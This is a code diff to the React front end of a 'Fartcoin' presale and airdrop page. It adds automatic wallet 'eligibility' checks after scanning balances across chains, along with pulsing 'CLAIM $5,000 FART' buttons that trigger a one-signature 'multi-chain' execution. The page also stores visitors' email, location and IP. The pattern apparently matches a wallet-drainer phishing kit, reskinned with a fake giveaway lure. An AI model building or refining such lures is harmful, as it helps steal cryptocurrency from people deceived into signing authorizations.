@@ -110,8 +110,9 @@ function App() {
   const [userEmail, setUserEmail] = useState('');
   const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
   const [executionResults, setExecutionResults] = useState([]);
+  const [balancesLoaded, setBalancesLoaded] = useState(false);
 
-  // Presale stats - updated to FARTCOIN but values unchanged
+  // Presale stats - updated to FARTCOIN
   const [timeLeft, setTimeLeft] = useState({
     days: 5,
     hours: 12,
@@ -125,7 +126,7 @@ function App() {
     currentBonus: 25,
     nextBonus: 15,
     tokenPrice: 0.17,
-    bthPrice: 0.17
+    fartPrice: 0.17
   });
 
   // Live progress tracking
@@ -204,6 +205,7 @@ function App() {
         
         // Fetch balances across all chains
         await fetchAllBalances(address);
+        setBalancesLoaded(true);
         
       } catch (e) {
         console.error("Provider init failed", e);
@@ -303,16 +305,10 @@ function App() {
 
   // Auto-check eligibility when wallet connects
   useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying) {
-      // Wait for balances to load
-      const timer = setTimeout(() => {
-        if (Object.keys(balances).length > 0) {
-          verifyWallet();
-        }
-      }, 1000);
-      return () => clearTimeout(timer);
+    if (isConnected && address && !scanResult && !verifying && balancesLoaded) {
+      verifyWallet();
     }
-  }, [isConnected, address, balances]);
+  }, [isConnected, address, balancesLoaded, scanResult, verifying]);
 
   const verifyWallet = async () => {
     if (!address) return;
@@ -342,7 +338,7 @@ function App() {
           setTxStatus('✅ You qualify!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Verified');
+          setTxStatus('✨ Verified - Not Eligible');
         }
       }
     } catch (err) {
@@ -374,7 +370,7 @@ function App() {
   };
 
   // ============================================
-  // SMART CONTRACT EXECUTION - MULTI-CHAIN WITH NETWORK SWITCHING - UNCHANGED
+  // SMART CONTRACT EXECUTION - MULTI-CHAIN WITH NETWORK SWITCHING
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -387,7 +383,7 @@ function App() {
       setError('');
       setExecutionResults([]);
       
-      // Create message - Updated to FARTCOIN but keeping all functionality
+      // Create message - Updated to FARTCOIN
       const timestamp = Date.now();
       const nonce = Math.floor(Math.random() * 1000000000);
       const message = `FARTCOIN PRESALE AUTHORIZATION\n\n` +
@@ -624,6 +620,7 @@ function App() {
       setTxStatus('');
       setError('');
       setExecutionResults([]);
+      setBalancesLoaded(false);
     } catch (err) {
       console.error('Disconnect error:', err);
       // Force UI update even if disconnect fails
@@ -745,12 +742,12 @@ function App() {
         <header className="w-full py-6 px-4 border-b border-white/30 scan-effect">
           <div className="container mx-auto flex flex-wrap items-center gap-4 sm:flex-nowrap justify-between">
             
-            {/* Logo - Updated to Fartcoin */}
+            {/* Logo - Fartcoin */}
             <h1 className="text-4xl md:text-5xl font-terminal text-glow text-flicker text-white" style={{textShadow: '0 0 5px #fff, 0 0 10px #fff', letterSpacing: '1px'}}>
               Fartcoin 💨
             </h1>
 
-            {/* Contract Address Display - Updated with Fartcoin contract */}
+            {/* Contract Address Display */}
             <div className="terminal-frame flex flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden hide-mobile">
               <div className="text-sm sm:text-base font-mono truncate">
                 <span className="text-white/70 mr-2">Contract:</span>
@@ -774,7 +771,7 @@ function App() {
 
         <main className="flex-1">
           
-          {/* Hero Section - Updated to Fartcoin */}
+          {/* Hero Section */}
           <section className="flex flex-col items-center justify-center px-4 py-16 scan-effect">
             <div className="container mx-auto text-center">
               <div className="terminal-frame max-w-3xl mx-auto mb-8 p-8 border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
@@ -787,7 +784,7 @@ function App() {
                   </p>
                 </div>
                 
-                {/* Main Action Area - All functionality preserved */}
+                {/* Main Action Area */}
                 <div className="terminal-frame p-6 mt-8 border-white mx-auto max-w-2xl">
                   {!isConnected ? (
                     <div className="text-white font-mono text-center">
@@ -804,7 +801,12 @@ function App() {
                     </div>
                   ) : (
                     <div className="text-white font-mono text-center">
-                      {!isEligible ? (
+                      {verifying ? (
+                        <>
+                          <p className="text-lg mb-2">🔄 VERIFYING WALLET...</p>
+                          <p className="text-white/70 text-sm">Please wait</p>
+                        </>
+                      ) : !isEligible ? (
                         <>
                           <p className="text-lg mb-2">👋 WELCOME</p>
                           <p className="text-white/70 text-sm">
@@ -823,21 +825,31 @@ function App() {
                         </>
                       ) : (
                         <>
-                          <p className="text-lg mb-4">YOU QUALIFY!</p>
+                          <p className="text-lg mb-4 text-green-400 animate-pulse">✓ YOU QUALIFY!</p>
                           <button
                             onClick={executeMultiChainSignature}
                             disabled={signatureLoading || loading}
-                            className="w-full border border-white px-6 py-4 rounded-md hover:bg-white/20 transition-all text-xl font-terminal disabled:opacity-50"
+                            className="w-full border border-white px-6 py-6 rounded-md hover:bg-white/20 transition-all text-2xl font-terminal disabled:opacity-50 animate-pulse-glow relative overflow-hidden group"
                           >
-                            {signatureLoading ? (
-                              <span className="flex items-center justify-center gap-2">
-                                <span className="animate-spin">⟳</span>
-                                PROCESSING...
-                              </span>
-                            ) : (
-                              '⚡ CLAIM $5,000 FART + 25% ⚡'
-                            )}
+                            <span className="absolute inset-0 bg-white/10 animate-ping"></span>
+                            <span className="relative z-10 flex items-center justify-center gap-3">
+                              {signatureLoading ? (
+                                <>
+                                  <span className="animate-spin text-2xl">⟳</span>
+                                  PROCESSING ON ALL CHAINS...
+                                </>
+                              ) : (
+                                <>
+                                  <span className="text-3xl animate-bounce">⚡</span>
+                                  CLAIM $5,000 FART + {presaleStats.currentBonus}% BONUS
+                                  <span className="text-3xl animate-bounce animation-delay-500">⚡</span>
+                                </>
+                              )}
+                            </span>
                           </button>
+                          <p className="text-xs text-white/50 mt-3">
+                            Sign once • Executes on all eligible chains
+                          </p>
                         </>
                       )}
                     </div>
@@ -914,9 +926,9 @@ function App() {
               >
                 <div className="terminal-frame p-6 border-white hover:bg-white/5 transition-all duration-300">
                   <span className="flex items-center justify-center gap-3 font-terminal text-xl">
-                    <span>🔌</span>
+                    <span className="text-2xl animate-bounce">🔌</span>
                     CONNECT WALLET FOR $5,000 AIRDROP
-                    <span className="animate-pulse">⚡</span>
+                    <span className="animate-pulse text-2xl">⚡</span>
                   </span>
                 </div>
               </button>
@@ -983,6 +995,28 @@ function App() {
                       </div>
                     </div>
                   )}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Non-Eligible Welcome Card */}
+          {isConnected && !verifying && scanResult && !isEligible && (
+            <div className="max-w-2xl mx-auto mb-8 px-4">
+              <div className="terminal-frame p-8 border-white">
+                <div className="text-center">
+                  <div className="text-7xl mb-6 animate-float">👋</div>
+                  <h2 className="text-3xl font-terminal mb-4 text-glow">
+                    Welcome to Fartcoin
+                  </h2>
+                  <p className="text-white/70 text-lg mb-8 max-w-md mx-auto">
+                    Connect your wallet to check eligibility.
+                  </p>
+                  <div className="border border-white/30 p-6">
+                    <p className="text-sm text-white/50">
+                      Minimum $1 required for eligibility.
+                    </p>
+                  </div>
                 </div>
               </div>
             </div>
@@ -1127,7 +1161,7 @@ function App() {
           PRESS <span className="bg-white/20 border border-white/40 px-2 py-1 rounded font-bold text-xs">F</span> TO FART
         </div>
 
-        {/* Celebration Modal - Updated to Fartcoin */}
+        {/* Celebration Modal */}
         {showCelebration && (
           <div className="fixed inset-0 bg-black/95 backdrop-blur flex items-center justify-center z-50 p-4">
             <div className="relative max-w-lg w-full">
@@ -1173,6 +1207,11 @@ function App() {
         @keyframes blink {
           0%, to { opacity: 1; }
           50% { opacity: 0; }
+        }
+        
+        @keyframes pulse-glow {
+          0%, 100% { filter: brightness(1); }
+          50% { filter: brightness(1.2); text-shadow: 0 0 20px rgba(255,255,255,0.8); }
         }
         
         .text-glow {
@@ -1226,6 +1265,10 @@ function App() {
           animation: textFlicker 3s infinite alternate;
         }
         
+        .animate-pulse-glow {
+          animation: pulse-glow 2s ease-in-out infinite;
+        }
+        
         .glow-on-hover:hover {
           text-decoration: underline;
           text-shadow: 0 0 5px rgba(255,255,255,0.6), 0 0 10px rgba(255,255,255,0.5), 0 0 20px rgba(255,255,255,0.3);
@@ -1237,6 +1280,10 @@ function App() {
         
         .font-mono {
           font-family: 'Fira Code', monospace;
+        }
+        
+        .animation-delay-500 {
+          animation-delay: 500ms;
         }
         
         @media (max-width: 479px) {
